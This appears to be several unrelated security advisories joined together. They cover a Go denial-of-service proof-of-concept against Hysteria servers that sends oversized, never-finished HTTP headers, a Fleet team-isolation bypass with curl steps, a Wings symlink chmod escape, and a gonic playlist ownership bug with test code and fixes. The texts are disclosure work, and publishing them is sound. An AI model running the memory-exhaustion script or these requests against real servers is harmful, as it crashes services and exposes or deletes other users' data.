type attackConnFactory struct {
	obfuscator obfs.Obfuscator
}

func (f *attackConnFactory) New(_ net.Addr) (net.PacketConn, error) {
	conn, err := net.ListenUDP("udp", nil)
	if err != nil {
		return nil, err
	}
	if f.obfuscator == nil {
		return conn, nil
	}
	return obfs.WrapPacketConn(conn, f.obfuscator), nil
}

func buildHeaderPayload(totalBytes, chunkSize int) []byte {
	prefix := []byte("GET / HTTP/1.1\r\nHost: victim\r\nUser-Agent: hy2-sniff-poc\r\n")
	if totalBytes <= len(prefix) {
		return prefix[:totalBytes]
	}
	out := make([]byte, 0, totalBytes)
	out = append(out, prefix...)
	linePayload := chunkSize - 32
	if linePayload < 64 {
		linePayload = 64
	}
	for i := 0; len(out) < totalBytes; i++ {
		line := fmt.Sprintf("X-Fill-%06d: %s\r\n", i, strings.Repeat("A", linePayload))
		remain := totalBytes - len(out)
		if len(line) > remain {
			line = line[:remain]
		}
		out = append(out, line...)
	}
	// 故意不追加最后一个空行 \r\n，迫使服务端在 sniff timeout 内持续读 header。
	return out
}

func makeClient(server, auth, sni string, insecure bool, pinSHA256, salamanderPSK string) (coreclient.Client, error) {
	serverAddr, err := net.ResolveUDPAddr("udp", server)
	if err != nil {
		return nil, err
	}
	cfg := &coreclient.Config{
		ConnFactory: &attackConnFactory{},
		ServerAddr:  serverAddr,
		Auth:        auth,
		TLSConfig: coreclient.TLSConfig{
			InsecureSkipVerify: insecure,
		},
	}
	host, _, err := net.SplitHostPort(server)
	if err == nil && sni == "" && net.ParseIP(host) == nil {
		cfg.TLSConfig.ServerName = host
	}
	if sni != "" {
		cfg.TLSConfig.ServerName = sni
	}
	if pinSHA256 != "" {
		nHash := strings.ToLower(strings.ReplaceAll(pinSHA256, ":", ""))
		cfg.TLSConfig.VerifyPeerCertificate = func(rawCerts [][]byte, _ [][]*x509.Certificate) error {
			if len(rawCerts) == 0 {
				return errors.New("no peer certificate")
			}
			h := sha256.Sum256(rawCerts[0])
			if hex.EncodeToString(h[:]) == nHash {
				return nil
			}
			return errors.New("no certificate matches the pinned hash")
		}
	}
	if salamanderPSK != "" {
		ob, err := obfs.NewSalamanderObfuscator([]byte(salamanderPSK))
		if err != nil {
			return nil, err
		}
		cfg.ConnFactory = &attackConnFactory{obfuscator: ob}
	}
	c, _, err := coreclient.NewClient(cfg)
	return c, err
}

func worker(id int, c coreclient.Client, target string, payload []byte, sendChunk int, linger time.Duration, results []string) {
	conn, err := c.TCP(target)
	if err != nil {
		results[id] = fmt.Sprintf("worker=%d dial error=%v", id, err)
		return
	}
	defer conn.Close()
	_ = conn.SetWriteDeadline(time.Now().Add(linger))
	sent := 0
	for sent < len(payload) {
		end := sent + sendChunk
		if end > len(payload) {
			end = len(payload)
		}
		n, err := conn.Write(payload[sent:end])
		if err != nil {
			results[id] = fmt.Sprintf("worker=%d partial_sent=%d error=%v", id, sent, err)
			return
		}
		sent += n
	}
	time.Sleep(linger)
	results[id] = fmt.Sprintf("worker=%d sent=%d", id, sent)
}

func main() {
	server := flag.String("server", "", "Hysteria server address, e.g. 1.2.3.4:443")
	auth := flag.String("auth", "", "Hysteria auth string/password")
	sni := flag.String("sni", "", "optional TLS SNI")
	insecure := flag.Bool("insecure", false, "skip TLS verification")
	pinSHA256 := flag.String("pin-sha256", "", "optional pinned server cert SHA256")
	salamanderPSK := flag.String("obfs-salamander-password", "", "optional salamander obfs password")
	targetHost := flag.String("target-host", "192.0.2.1", "must usually be an IP so sniff.Check() runs when rewriteDomain=false")
	targetPort := flag.Int("target-port", 80, "target port that should be covered by server sniff.tcpPorts")
	connections := flag.Int("connections", 16, "number of concurrent Hysteria TCP streams")
	headerBytes := flag.Int("header-bytes", 8*1024*1024, "bytes of incomplete HTTP header per stream")
	buildChunk := flag.Int("build-chunk", 8192, "approximate size of generated filler header lines")
	sendChunk := flag.Int("send-chunk", 64*1024, "bytes written per conn.Write call")
	lingerSec := flag.Float64("linger", 12, "seconds to keep each stream open after writing")
	flag.Parse()

	if *server == "" || *auth == "" {
		panic("--server and --auth are required")
	}
	if !*insecure && *pinSHA256 == "" {
		panic("provide one of: --insecure / --pin-sha256")
	}

	payload := buildHeaderPayload(*headerBytes, *buildChunk)
	target := net.JoinHostPort(*targetHost, fmt.Sprintf("%d", *targetPort))
	linger := time.Duration(*lingerSec * float64(time.Second))

	fmt.Printf("[*] server=%s target=%s streams=%d payload=%d\n", *server, target, *connections, len(payload))

	c, err := makeClient(*server, *auth, *sni, *insecure, *pinSHA256, *salamanderPSK)
	if err != nil {
		panic(err)
	}
	defer c.Close()

	results := make([]string, *connections)
	var wg sync.WaitGroup
	start := time.Now()
	for i := 0; i < *connections; i++ {
		wg.Add(1)
		go func(i int) {
			defer wg.Done()
			worker(i, c, target, payload, *sendChunk, linger, results)
		}(i)
	}

	wg.Wait()
	fmt.Printf("[*] elapsed=%s\n", time.Since(start).Round(time.Millisecond))
	for _, line := range results {
		fmt.Printf("    %s\n", line)
	}
	fmt.Println("[+] sent incomplete oversized HTTP headers; check server-side memory / stability")
}

```
### Impact

Testing showed that the server side used a maximum of 16GB.

Server memory DoS and may cause OOM.

## Summary

The global policy read endpoint (`GET /api/latest/fleet/policies/{policy_id}`) performs authorization against an empty `fleet.Policy{}` struct with nil TeamID, then fetches any policy by ID from the database without verifying the fetched policy actually belongs to the global scope. This allows a user with observer-level access on any single team to read the full details of policies belonging to any other team, bypassing Fleet's team isolation model.

## Details

The vulnerability is in `GetPolicyByIDQueries` at `server/service/global_policies.go:163-180`:

```go
func (svc Service) GetPolicyByIDQueries(ctx context.Context, policyID uint) (*fleet.Policy, error) {
	// Auth check uses empty Policy{} — TeamID is nil
	if err := svc.authz.Authorize(ctx, &fleet.Policy{}, fleet.ActionRead); err != nil {
		return nil, err
	}

	// Fetches ANY policy by ID, regardless of team ownership
	policy, err := svc.ds.Policy(ctx, policyID)
	if err != nil {
		return nil, err
	}
	// ... populates install_software and run_script, returns full policy
	return policy, nil
}
```

The authorization passes because the OPA rule at `server/authz/policy.rego:724-728` allows reading policies with null `team_id` for any user who holds a role on any team:

```rego
allow {
  is_null(object.team_id)
  object.type == "policy"
  team_role(subject, subject.teams[_].id) == [admin, maintainer, technician, observer, observer_plus][_]
  action == read
}
```

Since the auth object has nil TeamID, this rule fires for any team member. After authorization, `ds.Policy()` calls `policyDB()` at `server/datastore/mysql/policies.go:283-288` with a nil teamID:

```go
func policyDB(ctx context.Context, q sqlx.QueryerContext, id uint, teamID *uint) (*fleet.Policy, error) {
	teamWhere := "TRUE"  // nil teamID → no team filter
	args := []interface{}{id}
	if teamID != nil {
		teamWhere = "team_id = ?"
		args = append(args, *teamID)
	}
	// ... executes SELECT with WHERE p.id = ? AND {teamWhere}
```

This returns any policy regardless of team ownership, and the full policy object is returned to the caller without any post-fetch team verification.

By contrast, the properly-secured endpoints verify team scope:
- `GetTeamPolicyByIDQueries` (`team_policies.go:421-428`) sets `TeamID: ptr.Uint(teamID)` on the auth object and calls `ds.TeamPolicy()` which filters by team
- `DeleteGlobalPolicies` (`global_policies.go:255-263`) explicitly checks `policy.PolicyData.TeamID != nil` after fetching

## PoC

Prerequisites: A Fleet instance with at least two teams. User A has observer role on Team 1 only. Team 2 has policies that User A should not be able to view.

```bash
# Step 1: Authenticate as User A (Team 1 observer only)
TOKEN=$(curl -s -X POST https://fleet.example.com/api/latest/fleet/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"team1observer@example.com","password":"password"}' | jq -r '.token')

# Step 2: Enumerate policy IDs (they are sequential integers)
# Attempt to read a policy belonging to Team 2 (e.g., policy ID 5)
curl -s -H "Authorization: Bearer $TOKEN" \
  https://fleet.example.com/api/latest/fleet/policies/5

# Expected: 403 Forbidden (user has no access to Team 2)
# Actual: 200 OK with full policy data:
# {
#   "policy": {
#     "id": 5,
#     "name": "Team 2 Sensitive Policy",
#     "query": "SELECT * FROM sensitive_table WHERE ...",
#     "team_id": 2,
#     "passing_host_count": 42,
#     "failing_host_count": 7,
#     "description": "...",
#     "resolution": "...",
#     ...
#   }
# }
```

## Impact

An authenticated user with observer-level access on any single team can:

- **Read SQL queries** from all team policies across the Fleet instance, potentially revealing security monitoring strategies, compliance checks, and internal infrastructure details
- **View host pass/fail counts** for other teams' policies, leaking compliance posture data across team boundaries
- **Access software installer and script metadata** associated with other teams' policies via the `populatePolicyInstallSoftware` and `populatePolicyRunScript` calls
- **Enumerate all policies** by iterating sequential integer IDs

This breaks Fleet's team isolation model, which is designed to restrict visibility between teams. Organizations using teams to separate departments, clients, or security zones would have their policy data exposed across boundaries.

## Recommended Fix

Add a post-fetch check in `GetPolicyByIDQueries` to verify the returned policy is actually a global policy (nil TeamID), consistent with how `DeleteGlobalPolicies` operates:

```go
func (svc Service) GetPolicyByIDQueries(ctx context.Context, policyID uint) (*fleet.Policy, error) {
	if err := svc.authz.Authorize(ctx, &fleet.Policy{}, fleet.ActionRead); err != nil {
		return nil, err
	}

	policy, err := svc.ds.Policy(ctx, policyID)
	if err != nil {
		return nil, err
	}

	// Verify this is actually a global policy — team policies must be
	// accessed via the team-scoped endpoint which enforces team authorization
	if policy.TeamID != nil {
		return nil, authz.ForbiddenWithInternal(
			"attempting to read team policy via global endpoint",
			authz.UserFromContext(ctx),
			policy,
			fleet.ActionRead,
		)
	}

	if err := svc.populatePolicyInstallSoftware(ctx, policy); err != nil {
		return nil, ctxerr.Wrap(ctx, err, "populate install_software")
	}
	if err := svc.populatePolicyRunScript(ctx, policy); err != nil {
		return nil, ctxerr.Wrap(ctx, err, "populate run_script")
	}

	return policy, nil
}
```

Alternatively, re-authorize against the actual fetched policy object so OPA rules properly evaluate team membership, similar to how other Fleet endpoints handle object-level authorization.

In `wings/internal/ufs/fs_unix.go` (line 92-94), this function is defined and is used to change permissions of files in the server:

```go
func (fs *UnixFS) fchmodat(op string, dirfd int, name string, mode FileMode) error {
   return ensurePathError(unix.Fchmodat(dirfd, name, uint32(mode), 0), op, name)
}
```

This call to the unix function `fchmodat(int fd, char* name, mode_t mode, int flags)`  does not have the flag `AT_SYMLINK_NOFOLLOW` set, and Wings neither checks or validate if the target file is a symlink. This allows one to change permissions of files or folders outside of the server container by making symlinks to existing files in the host and then chmoding it.

## Summary

In gonic, the Subsonic API endpoints `/rest/deletePlaylist.view` and `/rest/getPlaylist.view` perform no per-resource authorization. Once authenticated as *any* user (admin or not), an attacker can:

1. **Delete any playlist owned by any other user** (including admin) by passing its `id`.
2. **Read the full contents** (name, comment, song list) of any other user's **private** (non-public) playlist by passing its `id`.

The Subsonic playlist `id` is `base64url("<userID>/<filename>.m3u")`. Because filenames are user-supplied or time-derived and the `userID` is a small integer, IDs are guessable and frequently exposed (e.g. a previously-public playlist that was later made private still has the same ID).

This breaks the multi-user trust boundary of gonic: a low-privileged user can wipe an administrator's curated playlists, and a user can exfiltrate any private playlist they obtain an ID for.

## Status

This was originally disclosed to the maintainer by email and has been **fixed in commit `6dd71e6a3c966867ef8c900d359a7df75789f410`** (`fix(subsonic): enforce playlist ownership on getPlaylist/deletePlaylist`, 2026-05-18). The fix has not yet been included in a tagged release; the latest tagged version `v0.20.1` is still vulnerable. Filing this advisory now that private vulnerability reporting is enabled on the repo, so the issue has a public record once the next release ships.

## Vulnerable code (pre-fix, at `v0.20.1` / commit `37090aa7`)

**Delete IDOR** — `server/ctrlsubsonic/handlers_playlist.go` lines 177-187:

```go
func (c *Controller) ServeDeletePlaylist(r *http.Request) *spec.Response {
    params := r.Context().Value(CtxParams).(params.Params)
    playlistID, err := params.GetFirstID("id", "playlistId")
    if err != nil {
        return spec.NewError(10, "please provide an `id` or `playlistId` parameter")
    }
    if err := c.playlistStore.Delete(playlistIDDecode(playlistID)); err != nil {
        return spec.NewError(0, "delete playlist: %v", err)
    }
    return spec.NewResponse()
}
```

The handler never loads the playlist to check `playlist.UserID == user.ID`. Compare to `ServeUpdatePlaylist` (same file, line 138) which *does* perform this check.

**Read IDOR** — `server/ctrlsubsonic/handlers_playlist.go` lines 51-68:

```go
func (c *Controller) ServeGetPlaylist(r *http.Request) *spec.Response {
    params := r.Context().Value(CtxParams).(params.Params)
    playlistID, err := params.GetFirstID("id", "playlistId")
    if err != nil {
        return spec.NewError(10, "please provide an `id` parameter")
    }
    playlist, err := c.playlistStore.Read(playlistIDDecode(playlistID))
    if err != nil {
        return spec.NewError(70, "playlist with id %s not found", playlistID)
    }
    // ... never checks playlist.UserID or playlist.IsPublic ...
    sub.Playlist = rendered
    return sub
}
```

The listing endpoint `ServeGetPlaylists` (line 38) correctly filters by `playlist.UserID != user.ID && !playlist.IsPublic`, but the singular `getPlaylist` did not.

## Live PoC (passing Go test)

A reproducer against the existing test fixture (`server/ctrlsubsonic`):

```go
func TestIDOR_DeleteOtherUsersPlaylist(t *testing.T) {
    f := newFixture(t)
    victimRelPath := filepath.Join("1", "victim-private.m3u")
    _ = f.contr.playlistStore.Write(victimRelPath, &playlistp.Playlist{
        UserID: f.admin.ID, Name: "victim-private", IsPublic: false,
        Items: []string{"/music/foo.flac"},
    })
    victimID := playlistIDEncode(victimRelPath).String()
    // f.alt is a non-admin, non-owner user
    body := f.query(t, f.contr.ServeDeletePlaylist, f.alt, url.Values{"id": {victimID}})
    // Subsonic returns status="ok" and the file is gone.
}
```

Test output:

```
--- PASS: TestIDOR_ReadOtherUsersPrivatePlaylist (0.07s)
--- PASS: TestIDOR_DeleteOtherUsersPlaylist (0.07s)
PASS
ok  go.senan.xyz/gonic/server/ctrlsubsonic 0.730s
```

## Equivalent HTTP request

```
GET /rest/deletePlaylist.view?u=lowpriv&p=lowpriv&v=1&c=poc&f=json&id=cGwtMS1zaGFyZWQubTN1
```

Response: `{"subsonic-response":{"status":"ok","version":"..."}}` — playlist is gone.

## Impact

- **Integrity / Availability**: low-privileged users can delete any other user's playlists, including admin's curated lists. There is no undo.
- **Confidentiality**: private playlists (including their comment fields) are readable by any authenticated user with an ID. IDs are predictable (`base64("<smallUserID>/<name>.m3u")`) and previously-public IDs persist after being marked private.
- **Trust boundary**: gonic supports multiple users (`createUser`, non-admin role). This bug collapsed the user-to-user authorization model.

## Affected versions

Latest tagged release `v0.20.1` and all prior versions back to when the playlist M3U store was introduced. Master HEAD is fixed at commit `6dd71e6a3c966867ef8c900d359a7df75789f410`.

## Suggested patch (applied by maintainer in `6dd71e6`)

Load the playlist first and enforce ownership in both handlers:

```go
// ServeGetPlaylist
if playlist.UserID != user.ID && !playlist.IsPublic {
    return spec.NewError(50, "you aren't allowed to read that user's playlist")
}

// ServeDeletePlaylist
if playlist.UserID != 0 && playlist.UserID != user.ID {
    return spec.NewError(50, "you aren't allowed to delete that user's playlist")
}
```

This mirrors the existing ownership check already present in `ServeCreateOrUpdatePlaylist` (line 84) and `ServeUpdatePlaylist` (line 138).

